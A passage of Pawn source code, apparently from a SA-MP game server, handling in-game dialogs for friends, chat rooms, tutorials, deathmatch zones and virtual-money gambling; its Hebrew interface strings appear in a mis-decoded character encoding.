				if(!strlen(inputtext)) return ShowPlayerDialog(playerid,dialog_friendsadd,DIALOG_STYLE_INPUT,@c(lightblue) "фхёЇ· чс°",@c(red) ":фыщЁхщ рх чьў юфыщЁхщ ∙ь ф∙чўя ∙р·ф °хЎф ьфхёщє ычс° ,ID-ьр фўьу· ∙хэ ус°. Ёр ьфўьщу р· ф","∙ьч сў∙ф","чцх°");
				new id = ReturnUser(inputtext,playerid);
				if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return ShowPlayerDialog(playerid,dialog_friendsadd,DIALOG_STYLE_INPUT,@c(lightblue) "фхёЇ· чс°",@c(red) ":ьр цхфф ю∙·ю∙ ыцф с∙°·. ·хыь ьЁёх· ю∙·ю∙ рч°","∙ьч сў∙ф","чцх°");
				if(playerid == id) return ShowPlayerDialog(playerid,dialog_friendsadd,DIALOG_STYLE_INPUT,@c(lightblue) "фхёЇ· чс°",@c(red) "Forever alone!\n:сч° ющ∙фх ∙фхр ьр р·ф","∙ьч сў∙ф","чцх°");
				if(playerinfo[id][friends] >= 9) return ShowPlayerDialog(playerid,dialog_friendsadd,DIALOG_STYLE_INPUT,@c(lightblue) "фхёЇ· чс°",@c(red) ":°∙щю· фчс°щэ ∙ь ю∙·ю∙ цф юьрф. Ёёф ю∙·ю∙ рч°","∙ьч сў∙ф","чцх°");
				for(new i = 1; i <= MAX_FRIENDS; i++)
				{
					format(string,sizeof(string),"Friend_%d",i);
					GetPVarString(playerid,string,string,sizeof(string));
					if(equal(string,GetName(id))) return ShowPlayerDialog(playerid,dialog_friendsadd,DIALOG_STYLE_INPUT,@c(lightblue) "фхёЇ· чс°",@c(red) ":фю∙·ю∙ фцф ыс° чс° ∙ьъ. Ёёф ю∙·ю∙ рч°","∙ьч сў∙ф","чцх°");
				}
				playerinfo[playerid][invitetime][0]--;
				format(string,sizeof(string),@c(green) ".%s-Ё∙ьчф сў∙· чс°х· ь",GetName(id));
				ShowPlayerDialog(playerid,dialog_friendsadde,DIALOG_STYLE_MSGBOX,@c(lightblue) "фхёЇ· чс°",string,"чцх°","ётх°");
				format(string,sizeof(string),@c(green) "!∙ьч ьъ сў∙· чс°х· %s [ID: %03d]\n\n/Friends рэ ·р∙°, ∙Ёщыэ ·хЇщЄх с°∙щю· чс°щэ рчу ∙ь ф∙Ёщ сЇўхуф",GetName(playerid),playerid);
				ShowPlayerDialog(id,dialog_friendsask,DIALOG_STYLE_MSGBOX,@c(lightblue) "сў∙· чс°х·",string,"рщ∙х°","учщщф");
				playerinfo[id][friendask] = playerid;
			}
			else ShowPlayerConstDialog(playerid,dialog_friends);
		}
		case dialog_friendsadde: if(response) ShowPlayerConstDialog(playerid,dialog_friends);
		case dialog_friendsask: if(response)
		{
			assert playerinfo[playerid][friendask] != INVALID_PLAYER_ID;
			new id = playerinfo[playerid][friendask], fname[MAX_PLAYER_NAME];
			if(playerinfo[playerid][friends] >= MAX_FRIENDS) return ShowPlayerDialog(playerid,dialog_friendsadde,DIALOG_STYLE_MSGBOX,@c(lightblue) "фхёЇ· чс°",@c(red) " .°∙щю· фчс°щэ ∙ьъ юьрф, Ёщ·я ьфхёщє Єу " #MAX_FRIENDS " чс°щэ","ь°∙щюф","ётх°");
			if(playerinfo[id][friends] >= MAX_FRIENDS) return ShowPlayerDialog(playerid,dialog_friendsadde,DIALOG_STYLE_MSGBOX,@c(lightblue) "фхёЇ· чс°",@c(red) " .°∙щю· фчс°щэ ∙ь ющ ∙фЎщЄ ьъ чс°х· ф·юьрф ь-" #MAX_FRIENDS " чс°щэ хьыя ьр Ёщ·я ьр∙°","ь°∙щюф","ётх°");
			for(new i = 1; i <= MAX_FRIENDS; i++)
			{
				format(string,sizeof(string),"Friend_%d",i);
				GetPVarString(playerid,string,fname,sizeof(fname));
				if(equal(fname,"None"))
				{
					fsetstring(fuser(playerid),string,GetName(id));
					SetPVarString(playerid,string,GetName(id));
					break;
				}
			}
			for(new i = 1; i <= MAX_FRIENDS; i++)
			{
				format(string,sizeof(string),"Friend_%d",i);
				GetPVarString(id,string,fname,sizeof(fname));
				if(equal(fname,"None"))
				{
					fsetstring(fuser(id),string,GetName(playerid));
					SetPVarString(id,string,GetName(playerid));
					break;
				}
			}
			PlaySound(playerid,1057);
			PlaySound(id,1057);
			format(string,sizeof(string),@c(green) "!рщ∙° р· сў∙· фчс°х· ∙ьъ %s",GetName(playerid));
			ShowPlayerDialog(id,dialog_friendsadde,DIALOG_STYLE_MSGBOX,@c(lightblue) "фхёЇ· чс°",string,"ь°∙щюф","ётх°");
			format(string,sizeof(string),@c(green) "!%s рщ∙°· р· сў∙· фчс°х· ∙ь",GetName(id));
			ShowPlayerDialog(playerid,dialog_friendsadde,DIALOG_STYLE_MSGBOX,@c(lightblue) "фхёЇ· чс°",string,"ь°∙щюф","ётх°");
			playerinfo[playerid][friends]++, playerinfo[id][friends]++, playerinfo[playerid][friendask] = INVALID_PLAYER_ID;
			Border(playerid,"updatefriends");
			Border(id,"updatefriends");
		}
		case dialog_fountain: if(response)
		{
			SetFountainsTo(listitem == sizeof(ObjectMaterials) ? random(sizeof(ObjectMaterials)) : listitem);
			PlaySound(playerid,1134);
		}
		case dialog_tutorials: if(response)
		{
			playerinfo[playerid][clickon] = listitem;
			new content[350];
			format(content,sizeof(content),@c(darkblue) "∙э фюу°щъ\n" @c(white) "%s",tutorialinfo[listitem][tutName]);
			format(content,sizeof(content),"%s\n" @c(darkblue) "·хыя\n" @c(white) "%s",content,Tutorial_GetText(listitem,"text"));
			if(strlen(tutorialinfo[listitem][tutMusicD]) > 0) format(content,sizeof(content),"%s\n" @c(darkblue) "юхёщўф\n" @c(white) "%s",content,tutorialinfo[listitem][tutMusicD]);
			format(content,sizeof(content),"%s\n" @c(darkblue) "юёЇ° фюу°щъ\n" @c(white) "#%02d",content,listitem+1);
			format(content,sizeof(content),"%s\n" @c(darkblue) "юёЇ° чьўщэ\n" @c(white) "%d",content,tutorialinfo[listitem][tutParts]);
			format(string,sizeof(string),"юу°щъ #%02d: %s",listitem+1,tutorialinfo[listitem][tutName]);
			ShowPlayerDialog(playerid,dialog_tutorial,DIALOG_STYLE_MSGBOX,string,content,"!ф·чь","чцх°");
		}
		case dialog_tutorial:
		{
			if(response)
			{
				if(playerinfo[playerid][tut][0] != -1 || !CanUseCommand(playerid)) return 1;
				playerinfo[playerid][tut][0] = listitem, playerinfo[playerid][tut][1] = 0, playerinfo[playerid][tut][2] = 0, playerinfo[playerid][nomsg] = 1;
				SetFreeze(playerid,1);
				GoTutorial(playerid);
			}
			else command(playerid,"/t");
		}
		case dialog_chat:
		{
			if(response)
			{
				if(!strlen(inputtext)) return Chat_Update(playerid,".ьр Ёщ·я ь∙ьхч фхуЄф °щўф");
				if(strlen(inputtext) > 60) return Chat_Update(playerid,".ффхуЄф р°хыф юущ");
				Chat_Write(playerinfo[playerid][inchat], inputtext, .playerid = playerid);
			}
			else ShowPlayerConstDialog(playerid,dialog_chatm);
		}
		case dialog_chatm:
		{
			if(response)
			{
				playerinfo[playerid][clickon] = listitem;
				switch(listitem)
				{
					case 0: // minimize
					{
						ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "Ў'рш ююхцЄ°",@c(green) ".фЎ'рш ∙ьўч· сх чьў ы°тЄ ююхцЄ°. ьр ·ўсь фхуЄх· ∙щ∙ьчх хфчьхя ∙ьх ьр щўЇхї\n/Chat :рэ р·ф юЄхЁщщя ьчцх° ьЎЇх· сЎ'рш, ф∙·ю∙ сЇўхуф","OK","");
						playerinfo[playerid][minchat] = true;
					}
					case 1: // list users
					{
						new list[64*MAX_CHAT_USERS], c = 0;
						for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inchat] == playerinfo[playerid][inchat]) format(list,sizeof(list),!strlen(list) ? ("%s{%s}%d) %s [ID: %03d%s]") : ("%s\n{%s}%d) %s [ID: %03d%s]"),list,HexStringOfColor(chatinfo[playerinfo[playerid][inchat]][chatManager] == i ? green : lightgreen),++c,GetName(i),i,chatinfo[playerinfo[playerid][inchat]][chatManager] == i ? (" | юЁфь фЎ'рш") : (""));
						ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_MSGBOX,@c(lightblue) "°∙щю· ю∙·ю∙щ фЎ'рш",list,"чцх°","");
					}
					case 2: // quit chat
					{
						Chat_Quit(playerid,.msg = true);
						ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,string,@c(green) ".щЎр· сфЎьчф юфЎ'рш","OK","");
					}
					case 3: // invite player
					{
						if(!playerinfo[playerid][invitetime][0]) return ShowPlayerDialog(playerid,dialog_chatme,DIALOG_STYLE_MSGBOX,@c(lightblue) "фцюЁф ьЎ'рш",@c(red) ".ыс° ∙ьч· фцюЁх· ьрч°хЁф. Ёёф ∙хс юрхч° щх·°","чцх°","");
						new c = 0;
						for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inchat] == playerinfo[playerid][inchat]) c++;
						if(c >= MAX_CHAT_USERS) return ShowPlayerDialog(playerid,dialog_chatme,DIALOG_STYLE_MSGBOX,@c(lightblue) "фцюЁф ьЎ'рш",@c(red) ".щ∙ щх·° юущ ю∙·ю∙щэ сЎ'рш, ьр Ёщ·я ьфхёщє Єху","чцх°","");
						ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "фцюЁ· ю∙·ю∙ ьЎ'рш",@c(green) ":фўьу ыря р· фыщЁхщ фюьр, чьў юфыщЁхщ рх фрщщущ ∙ь ф∙чўя ∙р·ф юЄхЁщщя ьфцющя ьЎ'рш","фцюя","чцх°");
					}
					case 4: // kick player
					{
						ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "фхЎр· ю∙·ю∙ юфЎ'рш",@c(green) ":фўьу ыря р· фыщЁхщ фюьр, чьў юфыщЁхщ рх фрщщущ ∙ь ф∙чўя ∙р·ф юЄхЁщщя ьфхЎщр юфЎ'рш","фхЎр","чцх°");
					}
					case 5: // set title
					{
						ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ ых·°· фЎ'рш",@c(green) ":фўьу ыря р· фых·°· фчу∙ф ∙р·ф юЄхЁщщя ь∙Ёх· ьЎ'рш","∙щЁхщ","чцх°");
					}
					case 6: // set color
					{
						new list[256];
						for(new i = 0; i < sizeof(Colors)-1; i++) format(list,sizeof(list),!i ? ("%s{%s}%s") : ("%s\n{%s}%s"),list,HexStringOfColor(Colors[i][colHex]),Colors[i][colHebName]);
						ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_LIST,@c(lightblue) "∙щЁхщ ЎсЄ фЎ'рш",list,"∙щЁхщ","чцх°");
					}
					case 7: // set manager
					{
						ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ юЁфь фЎ'рш",@c(green) ":фўьу ыря р· фыщЁхщ фюьр, чьў юфыщЁхщ рх фрщщущ ∙ь ф∙чўя ∙р·ф юЄхЁщщя ьфЇхъ ьюЁфь фЎ'рш\n" @c(red) "(!∙щэ ьс: рЇ∙°щ °ў юЁфь рчу ьЎ'рш! с°тЄ ∙·чьщє юЁфь, фтщ∙х· ∙ьъ щ°ух)","∙щЁхщ","чцх°");
					}
				}
			}
			else Chat_Update(playerid);
		}
		case dialog_chatm2:
		{
			new bool:justReturn = false;
			switch(playerinfo[playerid][clickon])
			{
				case 1: // list users
				{
					justReturn = true;
				}
				case 3: // invite player
				{
					if(response)
					{
						if(!playerinfo[playerid][invitetime][0]) return ShowPlayerDialog(playerid,dialog_chatme,DIALOG_STYLE_MSGBOX,@c(lightblue) "фцюЁф ьЎ'рш",@c(red) ".ыс° ∙ьч· фцюЁх· ьрч°хЁф. Ёёф ∙хс юрхч° щх·°","чцх°","");
						new c = 0;
						for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inchat] == playerinfo[playerid][inchat]) c++;
						if(c >= MAX_CHAT_USERS) return ShowPlayerDialog(playerid,dialog_chatme,DIALOG_STYLE_MSGBOX,@c(lightblue) "фцюЁф ьЎ'рш",@c(red) ".щ∙ щх·° юущ ю∙·ю∙щэ сЎ'рш, ьр Ёщ·я ьфхёщє Єху","чцх°","");
						if(!strlen(inputtext)) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "фцюЁф ьЎ'рш",@c(red) ":ьр ы·с· ыьхэ. Ёёф ∙хс","фцюя","чцх°");
						new id = ReturnUser(inputtext,playerid);
						if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "фцюЁф ьЎ'рш",@c(red) ":ьр цхфф ю∙·ю∙ ыцф с∙°·. Ёёф ∙хс","фцюя","чцх°");
						if(playerid == id) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "фцюЁф ьЎ'рш",@c(red) ":ьр Ёщ·я ьфцющя р· ЄЎюъ. Ёёф ∙хс","фцюя","чцх°");
						if(playerinfo[id][inchat] == playerinfo[playerid][inchat]) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "фцюЁф ьЎ'рш",@c(red) ":ю∙·ю∙ цф ыс° ю∙··є сЎ'рш ∙ьъ. сч° ю∙·ю∙ рч°","фцюя","чцх°");
						if(playerinfo[id][inchat] != INVALID_PLAYER_ID) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "фцюЁф ьЎ'рш",@c(red) ":ю∙·ю∙ цф ыс° ю∙··є сЎ'рш рч°. сч° ю∙·ю∙ рч°","фцюя","чцх°");
						playerinfo[playerid][invitetime][0]--;
						format(string,sizeof(string),"%s-Ё∙ьчф фцюЁф ьфЎш°Їх· ьЎ'рш ь",GetName(id));
						Chat_Write(playerinfo[playerid][inchat],string);
						format(string,sizeof(string),@c(green) "/chatinvite - :юцющя рх·ъ ьфЎш°є ьЎ'рш %s\n%s",GetName(playerid),chatinfo[playerinfo[playerid][inchat]][chatTitle]);
						SendClientMessage(id, green, string);
						//ShowPlayerDialog(id,dialog_chatinvite,DIALOG_STYLE_MSGBOX,@c(lightblue) "фцюЁф ьЎ'рш",string,"фЎш°є","учф");
						playerinfo[id][chatinvite] = playerinfo[playerid][inchat];
					}
					else justReturn = true;
				}
				case 4: // kick player
				{
					if(response)
					{
						if(!strlen(inputtext)) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "фхЎрф юфЎ'рш",@c(red) ":ьр ы·с· ыьхэ. Ёёф ∙хс","фхЎр","чцх°");
						new id = ReturnUser(inputtext,playerid);
						if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "фхЎрф юфЎ'рш",@c(red) ":ьр цхфф ю∙·ю∙ ыцф с∙°·. Ёёф ∙хс","фхЎр","чцх°");
						if(playerid == id) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "фхЎрф юфЎ'рш",@c(red) ":ьр Ёщ·я ьфхЎщр р· ЄЎюъ. рэ р·ф юЄхЁщщя ьЎр· юфЎ'рш, сч° срхЇЎщщ· фщЎщрф с·Ї°щш рЇ∙°хщх·. сч° ю∙·ю∙ рч°","фхЎр","чцх°");
						if(playerinfo[id][inchat] != playerinfo[playerid][inchat]) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "фхЎрф юфЎ'рш",@c(red) ":ю∙·ю∙ цф ьр ю∙··є сЎ'рш ∙ьъ. сч° ю∙·ю∙ рч°","фхЎр","чцх°");
						format(string,sizeof(string),"фхЎр юфЎ'рш %s фю∙·ю∙",GetName(id));
						Chat_Write(playerinfo[playerid][inchat],string);
						format(string,sizeof(string),":фхЎщр рх·ъ юфЎ'рш %s\n%s",GetName(playerid),chatinfo[playerinfo[playerid][inchat]][chatTitle]);
						ShowPlayerDialog(id,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "фхЎрф юфЎ'рш",string,"OK","");
						Chat_Quit(id);
					}
					else justReturn = true;
				}
				case 5: // set title
				{
					if(response)
					{
						if(!strlen(inputtext)) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ ых·°· фЎ'рш",@c(red) ":ьр ы·с· ыьхэ. Ёёф ∙хс","∙щЁхщ","чцх°");
						if(strlen(inputtext) > 30) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ ых·°· фЎ'рш",@c(red) ":фых·°· р°хыф юущ, юёЇ° ф·хщэ фюўёщюьщ фхр 30. Ёёф ∙хс","∙щЁхщ","чцх°");
						format(string,sizeof(string),":∙щЁф р· ых·°· фЎ'рш ь %s фю∙·ю∙",GetName(playerid));
						Chat_Write(playerinfo[playerid][inchat],string,false);
						Chat_Write(playerinfo[playerid][inchat],(format(chatinfo[playerinfo[playerid][inchat]][chatTitle],32,inputtext), inputtext));
					}
					else justReturn = true;
				}
				case 6: // set color
				{
					if(response)
					{
						chatinfo[playerinfo[playerid][inchat]][chatColor] = Colors[listitem][colHex];
						format(string,sizeof(string),"∙щЁф р· ЎсЄ фЎ'рш ь%s %s фю∙·ю∙",Colors[listitem][colHebName],GetName(playerid));
						Chat_Write(playerinfo[playerid][inchat],string);
					}
					else justReturn = true;
				}
				case 7: // set manager
				{
					if(response)
					{
						if(!strlen(inputtext)) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ юЁфь фЎ'рш",@c(red) ":ьр ы·с· ыьхэ. Ёёф ∙хс","∙щЁхщ","чцх°");
						new id = ReturnUser(inputtext,playerid);
						if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ юЁфь фЎ'рш",@c(red) ":ьр цхфф ю∙·ю∙ ыцф с∙°·. Ёёф ∙хс","∙щЁхщ","чцх°");
						if(playerid == id) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ юЁфь фЎ'рш",@c(red) ":р·ф ыс° юЁфь р· фЎ'рш. сч° ю∙·ю∙ рч°","∙щЁхщ","чцх°");
						if(playerinfo[id][inchat] != playerinfo[playerid][inchat]) return ShowPlayerDialog(playerid,dialog_chatm2,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ юЁфь фЎ'рш",@c(red) ":ю∙·ю∙ цф ьр ю∙··є сЎ'рш ∙ьъ. сч° ю∙·ю∙ рч°","∙щЁхщ","чцх°");
						format(string,sizeof(string),"%s-фЄсщ° р· Ёщфхь фЎ'рш ь %s",GetName(chatinfo[playerinfo[playerid][inchat]][chatManager] = id),GetName(playerid));
						Chat_Write(playerinfo[playerid][inchat],string);
						ShowPlayerDialog(playerid,dialog_chatme,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ юЁфь фЎ'рш",@c(red) ".фЄс°· р· тщ∙· Ёщфхь фЎ'рш ∙фщщ·ф ьъ ью∙·ю∙ рч°\n.ьр ·хыь ьсЎЄ Єху ЇЄхьх· фў∙х°х· сЁщфхь фЎ'рш","OK","");
						ShowPlayerDialog(id,dialog_chatme,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ юЁфь фЎ'рш",@c(green) "!Ёщфхь фЎ'рш фхЄс° рьщъ","OK","");
					}
					else justReturn = true;
				}
			}
			if(justReturn) ShowPlayerConstDialog(playerid,dialog_chatm);
		}
		case dialog_chatme: ShowPlayerConstDialog(playerid,dialog_chatm);
		case dialog_rate: if(response)
		{
			assert playerinfo[playerid][lasttele] != -1;
			fsetint(file_trating,Teleports[playerinfo[playerid][lasttele]][Tcmd],Teleports[playerinfo[playerid][lasttele]][Trate] += TeleportRating[listitem][Tratescore]);
			new header[64];
			format(header,sizeof(header),@c(lightblue) "%s ущ°хт ф∙щтх°",Teleports[playerinfo[playerid][lasttele]][Tcmd]);
			format(string,sizeof(string),@c(green) ":" @c(yellow) "%s" @c(green) " ущ°т· сфЎьчф р· ф∙щтх°\n" @c(yellow) "%s",Teleports[playerinfo[playerid][lasttele]][Tcmd],TeleportRating[listitem][Tratename]);
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,header,string,"OK","");
			playerinfo[playerid][rated][playerinfo[playerid][lasttele]] = true;
		}
		case dialog_admintoggle: if(response)
		{
			format(string,sizeof(string),"%s %s",AdminToggleType[listitem][atCommand],playerinfo[playerid][atoggle][listitem] ? ("off") : ("on"));
			command(playerid,string);
			ShowPlayerConstDialog(playerid,dialog_admintoggle);
		}
		case dialog_tdm: if(response)
		{
			new wmenu[512];
			#define syncweapon(%1) for(new i = 0; i < 5; i++) if(TDMZs[playerinfo[playerid][tdmclick][0]][tdmzWeapons_%1][i] != -1) format(string,sizeof(string),!i ? ("%s%s") : ("%s, %s"),string,WeaponName(TDMZs[playerinfo[playerid][tdmclick][0]][tdmzWeapons_%1][i])); format(wmenu,sizeof(wmenu),!strlen(wmenu) ? ("%s%s") : ("%s\n%s"),wmenu,string); string = ""
			syncweapon(1);
			syncweapon(2);
			syncweapon(3);
			syncweapon(4);
			#undef syncweapon
			playerinfo[playerid][tdmclick][1] = listitem;
			ShowPlayerDialog(playerid,dialog_tdm2,DIALOG_STYLE_LIST,@c(lightblue) "TDM счщ°· Ё∙ўщэ ь∙щтх°",wmenu,"!∙чў","фўхуэ");
		}
		case dialog_tdm2:
		{
			if(response)
			{
				if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфЎш°є ьрцх° ущ-рэ ыр∙° р·ф ссчщ°· фуюхщх·");
				if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьрцх° ущ-рэ ыр∙° р·ф сюЎс");
				if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьрцх° ущ-рэ ыр∙° р·ф сЇЄщьх·");
				if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сюЁхє");
				if(WaitingAct(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх ьЇЁщ ыЁщёф ьЇЄщьх·");
				if(!playerinfo[playerid][returntodm] && playerinfo[playerid][tdmzone] == playerinfo[playerid][tdmclick][0]) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр срцх° фшщущрэ фцф");
				if(playerinfo[playerid][level] < TDMZs[playerinfo[playerid][tdmclick][0]][tdmzLevel])
				{
					format(string,sizeof(string)," .сыущ ьф∙·т° ьрцх° фшщущрэ фцф Єьщъ ьфщх· ьЇчх· с°юф %d",TDMZs[playerinfo[playerid][tdmclick][0]][tdmzLevel]);
					return SendClientMessage(playerid,green,string);
				}
				playerinfo[playerid][tdmclick][2] = listitem;
				SetPlayerVirtualWorld(playerid,worlds_tdm + playerinfo[playerid][tdmclick][0]);
				playerinfo[playerid][tdmzone] = playerinfo[playerid][tdmclick][0];
				if(IsPlayerInAnyVehicle(GetPlayerVehicleID(playerid))) SetVehicleToRespawn(GetPlayerVehicleID(playerid));
				if(playerinfo[playerid][spweapon] != spw_none) DropSPW(playerid);
				if(playerinfo[playerid][powerparam] > powerparam_none) StopUsingPower(playerid);
				ResetWeapons(playerid);
				SetPlayerHealth(playerid,TDMZs[playerinfo[playerid][tdmclick][0]][tdmzHStatus][0]);
				SetPlayerArmour(playerid,TDMZs[playerinfo[playerid][tdmclick][0]][tdmzHStatus][1]);
				TeamDefines(playerid);
				SetPlayerColor(playerid,TDMZs[playerinfo[playerid][tdmclick][0]][tdmzColors][playerinfo[playerid][tdmclick][1]]);
				#define syncgweapon(%1) if(listitem+1 == %1) for(new i = 0; i < 5; i++) if(TDMZs[playerinfo[playerid][tdmclick][0]][tdmzWeapons_%1][i] != -1) GiveWeapon(playerid,TDMZs[playerinfo[playerid][tdmclick][0]][tdmzWeapons_%1][i],TDMZs[playerinfo[playerid][tdmclick][0]][tdmzAmmo_%1][i])
				syncgweapon(1);
				syncgweapon(2);
				syncgweapon(3);
				syncgweapon(4);
				#undef syncgweapon
				SetCameraBehindPlayer(playerid);
				SetPlayerInterior(playerid,TDMZs[playerinfo[playerid][tdmclick][0]][tdmzInterior]);
				if(!playerinfo[playerid][frozen][0]) playerinfo[playerid][unftimer] = 2;
				SetFreeze(playerid,1);
				switch(TDMZs[playerinfo[playerid][tdmclick][0]][tdmzPositions][playerinfo[playerid][tdmclick][1]])
				{
					case 1:
					{
						new r = random(sizeof(TDMZPositions_Heavy_T1));
						SetPlayerPos(playerid,TDMZPositions_Heavy_T1[r][0],TDMZPositions_Heavy_T1[r][1],TDMZPositions_Heavy_T1[r][2] + (!playerinfo[playerid][noticedmsg][3] ? 7.0 : 0.0));
						SetPlayerFacingAngle(playerid,TDMZPositions_Heavy_T1[r][3]);
					}
					case 2:
					{
						new r = random(sizeof(TDMZPositions_Heavy_T2));
						SetPlayerPos(playerid,TDMZPositions_Heavy_T2[r][0],TDMZPositions_Heavy_T2[r][1],TDMZPositions_Heavy_T2[r][2] + (!playerinfo[playerid][noticedmsg][3] ? 7.0 : 0.0));
						SetPlayerFacingAngle(playerid,TDMZPositions_Heavy_T2[r][3]);
					}
				}
				if(!playerinfo[playerid][noticedmsg][3])
				{
					format(string,sizeof(string)," !%s с°хъ фср ьрцх° фшщ-ущ-рэ",TDMZs[playerinfo[playerid][tdmclick][0]][tdmzName]);
					SendClientMessage(playerid,green,string);
					SendClientMessage(playerid,green," .рх ф∙·т° ьюўхэ рч° /qdmz - Єь юЁ· ьЎр· юфрцх°, °∙хэ р· фЇўхуф");
					playerinfo[playerid][noticedmsg][3] = 1;
					SavePlayerWeapons(playerid);
				}
			}
			else command(playerid,TDMZs[playerinfo[playerid][tdmclick][0]][tdmzCmd]);
		}
		case dialog_gamblingmoney: if(response)
		{
			if(GetPlayerCheckpoint(playerid) != cp_gambling || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сЁўху· фщюх° (ўцщЁх) ыущ ьфю°");
			if(!strlen(inputtext)) return ShowPlayerDialog(playerid,dialog_gamblingmoney,DIALOG_STYLE_INPUT,@c(lightblue) "фщюх°щэ",@c(yellow) ":ьр фўьу· ыьхэ. Ёёф ∙хс","GO!","ётх°");
			new gamb = strval(inputtext), win = randomEx(0,8);
			if(gamb < 0 || gamb > GetMoney(playerid)) return ShowPlayerDialog(playerid,dialog_gamblingmoney,DIALOG_STYLE_INPUT,@c(lightblue) "фщюх°щэ",@c(yellow) ":ёыхэ ∙тхщ. Ёёф ∙хс","GO!","ётх°");
			if(gamb > 50000) return ShowPlayerDialog(playerid,dialog_gamblingmoney,DIALOG_STYLE_INPUT,@c(lightblue) "фщюх°щэ",@c(yellow) ":юх·° ьфю° Єу юўёщюхэ 50,000$","GO!","ётх°");
			GiveMoney(playerid,0-gamb);
			if(win == 5)
			{
				GiveMoney(playerid,gamb*2);
				format(string,sizeof(string)," !фщю°· Єь $%d, хцыщ· с-%d$",gamb,gamb*2);
				SendClientMessage(playerid,orange,string);
				PlaySound(playerid,4201);
				if(gamb*2 >= 50000)
				{
					format(string,sizeof(string)," $ Las Venturas фщю° Єь ыёє хцыф с-$%d! Ёёх р· юцьыэ срчу юфўцщЁхрщэ ∙ь %s $",gamb*2,GetName(playerid));
					SendClientMessageToAll(green,string);
				}
			}
			else SendClientMessage(playerid,red," !ьр цыщ·");
		}
		case dialog_gamblingmachine:
		{
			if(response)
			{
				if(!strlen(inputtext) || !IsNumeric(inputtext)) return ShowPlayerDialog(playerid,dialog_gamblingmachine,DIALOG_STYLE_INPUT,@c(lightblue) "фщюх°щэ",@c(yellow) ":фўьу· ёыхэ ∙тхщ, Ёёф ∙хс","GO!","ётх°");
				new mn = strval(inputtext);
				if(mn < 1 || mn > GetMoney(playerid)) return ShowPlayerDialog(playerid,dialog_gamblingmachine,DIALOG_STYLE_INPUT,@c(lightblue) "фщюх°щэ",@c(yellow) ":фёыхэ ∙фўьу· ∙тхщ, Ёёф ∙хс","GO!","ётх°");
				playerinfo[playerid][gambleinfo][1] = mn;
				GamblingFunction(playerid,"show");
			}
			else if(playerinfo[playerid][gambleinfo][0]) GamblingFunction(playerid,"end");
		}
		case dialog_cabonus: if(response)
		{
			new c = 0, itsID = -1, dia = dialog_ni;
			for(new i = 0; i < sizeof(ChatActivityBonus) && itsID == -1; i++)
			{
				if(ChatActivityBonus[i][cabActivity] == CActID)
				{
					if(listitem == c) itsID = i;
					c++;
				}
				else if(c > 0) break;
			}
			assert itsID > -1;
			playerinfo[playerid][clickon] = itsID;
			if(GetMoney(playerid) < ChatActivityBonus[itsID][cabCost])
			{
				format(string,sizeof(string),@c(red) ".рщя ьъ юёЇщў ыёє ыущ ьўЁх· р· фсхЁхё фцф, фхр Єхьф $%d",ChatActivityBonus[itsID][cabCost]);
				if(playerinfo[playerid][bank] >= ChatActivityBonus[itsID][cabCost])
				{
